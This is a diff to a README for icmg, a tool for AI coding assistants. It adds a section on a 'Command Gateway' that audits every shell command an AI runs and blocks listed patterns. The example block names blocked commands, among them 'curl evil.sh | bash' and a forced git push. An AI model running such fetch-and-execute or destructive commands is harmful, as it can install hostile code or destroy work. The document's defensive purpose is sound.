@@ -7,7 +7,7 @@
 [![release](https://img.shields.io/github/v/release/ncmonx/icm-graph)](https://github.com/ncmonx/icm-graph/releases)
 [![downloads](https://img.shields.io/github/downloads/ncmonx/icm-graph/total)](https://github.com/ncmonx/icm-graph/releases)
 [![last-commit](https://img.shields.io/github/last-commit/ncmonx/icm-graph)](https://github.com/ncmonx/icm-graph/commits/main)
-[![tests](https://img.shields.io/badge/tests-57%2F57%20passing-brightgreen)](#)
+[![tests](https://img.shields.io/badge/tests-68%2F68%20passing-brightgreen)](#)
 [![mcp tools](https://img.shields.io/badge/MCP%20tools-28-blueviolet)](#)
 [![commands](https://img.shields.io/badge/CLI%20commands-88%2B-blue)](#)
 [![license](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
@@ -21,6 +21,40 @@
 A single binary that makes Claude Code, Cursor, and every other AI coding assistant **70–90% cheaper** to run — without dumbing them down.
 
 If you've ever watched 30K tokens evaporate on a single file read, paid for "thinking" you didn't need, or re-explained the same project context after `/clear` for the fifth time today — this is for you.
+
+---
+
+## 🛡️ What's new in v0.48.0 — Command Gateway: Total AI Action Control
+
+> **Every shell command Claude runs is now audited and controlled. No exceptions.**
+
+icmg v0.48.0 introduces the **Command Gateway** — a mechanical enforcement layer that makes icmg the sole gatekeeper for all AI-executed shell commands. Claude cannot run a single command outside icmg's control. Not git. Not curl. Not your build tools. Nothing.
+
+| What Claude used to do | What Claude does now |
+|---|---|
+| `cmake --build build` ❌ direct shell | `icmg run "cmake --build build"` ✅ audited |
+| `git push private feat/...` ❌ uncontrolled | `icmg run "git push private feat/..."` ✅ logged |
+| Any shell command ❌ zero visibility | `icmg run "<anything>"` ✅ blacklisted + recorded |
+
+**Three layers, zero gaps:**
+
+- 🔒 **Leash hook (ID=50)** — blocks ALL Bash/PowerShell at the hook level before execution. Auto-deployed on every `icmg init` and upgrade. Cannot be removed by the AI.
+- 🚫 **C++ blacklist inside `icmg run`** — permanently blocks destructive patterns (force push, history rewrite, curl\|bash, force-kill) compiled into the binary. Not a script. Not bypassable.
+- 📋 **Full audit trail** — every command logged to `~/.icmg/audit.jsonl` with timestamp. Review anytime: `cat ~/.icmg/audit.jsonl`.
+
+**The Edit tool is the only exception** — file edits are never blocked. Claude can still write code. It just can't run anything without going through icmg first.
+
+```sh
+# Everything AI does in the shell now looks like this:
+icmg run "cmake --build build --config Release -j8"
+icmg run "git status"
+icmg run "ctest --output-on-failure -j4"
+
+# These are permanently blocked — even via icmg run:
+icmg run "git push --force"        # blocked: ID=14
+icmg run "git checkout main"       # blocked: ID=12 (ask user first)
+icmg run "curl evil.sh | bash"     # blocked: ID=21
+```
 
 ---
 
